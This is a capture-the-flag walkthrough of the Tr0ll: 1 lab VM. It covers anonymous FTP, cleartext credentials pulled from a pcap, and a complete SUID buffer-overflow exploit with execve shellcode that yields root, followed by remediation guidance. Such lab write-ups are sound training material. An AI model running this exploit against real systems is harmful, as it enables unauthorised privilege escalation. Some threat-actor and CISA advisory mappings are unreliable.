# Tr0ll: 1 — The Internet Is a Dangerous Place. Here, Hold My PCAP.

( ͡° ͜ʖ ͡°) Look at guys!! Tr0ll 1 is the VM that taught a generation of CTF players what it means to be misdirected on purpose. The machine is packed with troll mechanics: a `/secret` path that just says "lol nope", decoy users in `/etc/passwd`, and rabbit holes at every corner. But underneath the trolling there are real vulnerabilities: anonymous FTP exposing a network capture, cleartext SSH credentials inside that capture, and a SUID binary vulnerable to a classic 32-bit stack buffer overflow. No ASLR, no NX, no canary. Just vibes and shellcode. Big respect to maleus for creating the whole Tr0ll series. gg.

| Field | Value |
|---|---|
| **Level** | Easy/Beginner |
| **Target VM** | Tr0ll: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-1,100/ |
| **Techniques** | Nmap service enumeration, anonymous FTP access, PCAP/Wireshark credential extraction, SSH login, SUID binary discovery, 32-bit stack buffer overflow (no mitigations), shellcode injection |
| **CVEs** | CWE-284 (Anonymous FTP access with credential exposure), CWE-121 (Stack-based Buffer Overflow in SUID binary), CWE-693 (Missing security mitigations: no ASLR/NX/canary) |
| **APT Groups** | APT28 (Fancy Bear): uses exposed network services and cleartext credentials in capture files as initial access vector in targeted intrusions; FIN7: leverages anonymous FTP exposure for credential harvesting in pre-ransomware campaigns |

---

## Attack Summary

```
nmap → FTP (21, anonymous), SSH (22), HTTP (80)
  → HTTP robots.txt → /secret → "lol nope" (rabbit hole)
  → FTP anonymous → lol.pcap download
  → strings lol.pcap / Wireshark → USER overflow, PASS Pass.txt
  → SSH overflow:Pass.txt → uid=1002(overflow)
  → find -perm -4000 → /var/www/html/sup3rs3cr3tdirlol/r00t (SUID)
  → GDB: offset 268 bytes → EIP overwrite
  → shellcode in NOP sled → uid=0(root)
  → cat /root/proof.txt → 702a8c18d29c6f3ca0d99ef5712bfbdc
```

---

## Methodology

1. Full port scan to identify FTP, SSH, and HTTP
2. HTTP enumeration: robots.txt reveals /secret (rabbit hole)
3. FTP anonymous login and download of lol.pcap
4. PCAP analysis to extract cleartext FTP credentials
5. SSH login with extracted credentials
6. SUID binary discovery via find command
7. Buffer overflow offset identification with GDB
8. Shellcode injection via NOP sled for root shell
9. Root flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
nmap -sn 192.168.56.0/24
# Target: 192.168.56.101 (adjust to your subnet)

nmap -sV -A -p- 192.168.56.101
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx  1 1000  0  8068 Aug 10 2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
80/tcp open  http    Apache httpd 2.4.7
| http-robots.txt: 1 disallowed entry
|_/secret
```

Three attack surfaces. FTP is immediately interesting: anonymous login allowed and a `.pcap` file is visible directly from the Nmap scan. Always run `-sV` and `-sC` together so NSE scripts like `ftp-anon` trigger automatically.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — HTTP Enumeration (Rabbit Hole Alert)

```bash
curl -s http://192.168.56.101/robots.txt
# Disallow: /secret

curl -s http://192.168.56.101/secret/
# → "lol nope"
```

The `/secret` path is intentional misdirection. Visit it, confirm it is a dead end, move on. Do not spend time on it. The machine is called Tr0ll for a reason.

**Real-world note:** Threat actors and CTF creators alike use misdirection paths. In real environments, dead-end paths waste incident responders' time. The discipline of recognizing and moving past rabbit holes quickly is a genuine professional skill.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Anonymous FTP and PCAP Download

```bash
ftp 192.168.56.101
# Connected to 192.168.56.101.
# 220 (vsFTPd 3.0.2)
# Name (192.168.56.101:kali): anonymous
# Password: (press Enter)
# 230 Login successful.

ftp> ls -la
ftp> get lol.pcap
ftp> bye
```

`lol.pcap` is an 8KB network capture. The name is the first troll: "lol" sounds trivial but contains the credentials we need.

**Real-world note:** Anonymous FTP with world-readable files is a critical misconfiguration. Network capture files (`.pcap`, `.cap`, `.pcapng`) stored on accessible servers are consistently high-value targets: they frequently contain cleartext credentials, session tokens, and internal communication. APT28 and FIN7 both use FTP enumeration as part of automated pre-attack recon.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1078.002 — Valid Accounts: Domain Accounts

---

## Step 4 — PCAP Analysis: Credential Extraction

Quick approach with strings:

```bash
strings lol.pcap | grep -iE "user|pass|login"
# → USER overflow
# → PASS Pass.txt
```

Detailed approach with Wireshark: open `lol.pcap`, filter `ftp`, follow any TCP stream. The FTP session clearly shows:

```
220 (vsFTPd 3.0.2)
USER overflow
331 Please specify the password.
PASS Pass.txt
230 Login successful.
```

Credentials: `overflow` / `Pass.txt`

Note: the password is literally the string `Pass.txt`, not a reference to a file. This is another Tr0ll troll: the name looks like a filename but it is the actual password.

**MITRE ATT&CK:** T1040 — Network Sniffing; T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 5 — SSH Login as overflow

```bash
ssh overflow@192.168.56.101
# Password: Pass.txt

overflow@Tr0ll:~$ id
# uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

Shell obtained. Note the decoy user list in `/etc/passwd`: troll, maleus, genphlux, wytshadow, lololol, ps-aux, felux, Eagle11, usmc8892, blawrg, vis1t0r. Most are pure troll bait. Only `overflow` is reachable.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Step 6 — SUID Binary Discovery

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for a non-standard SUID binary. Also enumerate the HTTP root for hidden directories:

```bash
ls -la /var/www/html/
# → sup3rs3cr3tdirlol/ (hidden directory in web root)

ls -la /var/www/html/sup3rs3cr3tdirlol/
# -rwsr-xr-x 1 root root 8401 Aug 10 2014 r00t
```

The binary `r00t` has SUID root set. Test it:

```bash
/var/www/html/sup3rs3cr3tdirlol/r00t AAAA
# → AAAA
# (echoes argument — vulnerable strcpy pattern)
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Setuid and Setgid

---

## Step 7 — Buffer Overflow: Find EIP Offset with GDB

```bash
gdb -q /var/www/html/sup3rs3cr3tdirlol/r00t

(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()
# EIP = 0x42424242 (BBBB) — offset is 268 bytes

(gdb) info registers esp
# esp: 0xbffffb50
# Outside GDB the real ESP is approximately 0xbffffb90 (GDB adds env overhead)
```

EIP overwrite offset: **268 bytes**

**MITRE ATT&CK:** T1203 — Exploitation for Client Execution; T1068 — Exploitation for Privilege Escalation

---

## Step 8 — Buffer Overflow Exploit: Shellcode Injection

Linux x86 `execve("/bin/sh")` shellcode (19 bytes):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Structure: 268 bytes padding + 4 bytes return address (pointing into NOP sled) + 16-byte NOP sled + shellcode

```bash
/var/www/html/sup3rs3cr3tdirlol/r00t $(python -c \
  'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + \
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

```
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)
# whoami
root
```

If the exploit crashes, adjust the return address by increments of 8-16 bytes in either direction. The NOP sled provides margin.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 9 — Root Flag

```bash
cat /root/proof.txt
```

```
Good job, you did it!

702a8c18d29c6f3ca0d99ef5712bfbdc
```

(☞ﾟヮﾟ)☞ Root. nailed it fr fr.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | `overflow:Pass.txt` | lol.pcap (FTP anonymous) | SSH login |
| Root flag | `702a8c18d29c6f3ca0d99ef5712bfbdc` | /root/proof.txt | Challenge completion |
| SUID binary | `/var/www/html/sup3rs3cr3tdirlol/r00t` | find -perm -4000 | Buffer overflow privesc |
| BOF offset | 268 bytes to EIP | GDB pattern analysis | Exploit construction |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Anonymous FTP exposing network capture | PCAP files contain cleartext credentials; FTP anonymous is a critical misconfiguration (CIS Control 4) | Disable anonymous FTP; never store network captures on publicly accessible servers |
| 2 | Cleartext credentials in PCAP | Wireshark trivially extracts credentials from unencrypted FTP, HTTP, SMTP, Telnet traffic | Replace FTP with SFTP; enforce TLS everywhere; never use cleartext protocols for authentication |
| 3 | SUID binary compiled without mitigations | Binaries without ASLR/NX/canary are trivially exploitable with classical ret-addr overflows | Compile with -fstack-protector-all; enable ASLR (echo 2 > /proc/sys/kernel/randomize_va_space); mark stack NX |
| 4 | Custom SUID binary in web root | Exposing a SUID binary via the web root is a double vulnerability: FTP/web discovery + direct execution | Never place SUID binaries in web-accessible directories; minimize all SUID binary count |
| 5 | Decoy user accounts as misdirection | Real threat actors also create decoy accounts for persistence and attribution confusion | Audit /etc/passwd regularly; alert on unexpected user account creation |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Collection | Collection | Network Sniffing | T1040 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid | T1548.001 |
| Execution | Execution | Exploitation for Client Execution | T1203 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP**: `anonymous_enable=NO` in vsftpd.conf; migrate to SFTP with key authentication
2. **Never store PCAP files on FTP servers**: network captures belong in secured, authenticated storage only
3. **Compile SUID binaries with full mitigations**: `-fstack-protector-all`, position-independent executable (`-pie -fPIE`), no-execute stack
4. **Enable ASLR system-wide**: `echo 2 > /proc/sys/kernel/randomize_va_space`; persist in `/etc/sysctl.conf`
5. **Minimize SUID binaries**: audit with `find / -perm -4000 -type f`; remove SUID from any non-essential binary
6. **Replace FTP with SFTP**: all file transfer should use encrypted, authenticated channels

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services; audit SUID binaries quarterly |
| Protect | Access Control | Disable anonymous FTP; restrict file system permissions |
| Protect | Data Security | Never store captures/credentials on accessible servers; enforce encryption |
| Detect | Anomalies and Events | Alert on anonymous FTP logins; monitor SUID execution |
| Respond | Response Planning | Disable anonymous FTP; rotate exposed credentials immediately |
| Recover | Recovery Planning | Rebuild compromised host; audit all FTP-accessible content |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Disable anonymous FTP access |
| AC-6 | Least Privilege | Remove SUID from all non-essential binaries |
| CM-7 | Least Functionality | Disable anonymous FTP; restrict web root content |
| IA-5 | Authenticator Management | Replace FTP credentials with SFTP key pairs |
| SC-8 | Transmission Confidentiality | Replace FTP with SFTP; enforce TLS for all services |
| SI-16 | Memory Protection | Enable ASLR, NX; compile with stack protector |

### CISA KEV

Anonymous FTP with sensitive file exposure maps directly to CISA Advisory AA21-131A guidance on securing file transfer services. CISA explicitly recommends disabling anonymous FTP and replacing with SFTP as a Priority 1 remediation action.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP)
- **D3-OAM** — Operating System Administrative Management (ASLR, NX, stack canary)
- **D3-NTA** — Network Traffic Analysis (detect cleartext FTP credential transmission)

---

## Final Thoughts

Tr0ll: 1 is a genuine classic. The troll mechanics are executed with commitment: every rabbit hole is placed to build the habit of not chasing dead ends. The real lesson is that beneath the misdirection, the vulnerabilities are completely mundane: anonymous FTP, cleartext credentials in a capture file, and a SUID binary without mitigations. These are not exotic edge cases — they are findings that show up in real production environments every year.

The buffer overflow is a gentle introduction to x86 stack exploitation: no ASLR, no NX, no canary. A NOP sled and 19 bytes of shellcode. If you can do Tr0ll 1, you have the foundation for every more complex BOF challenge ahead. legit goated machine for the fundamentals. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
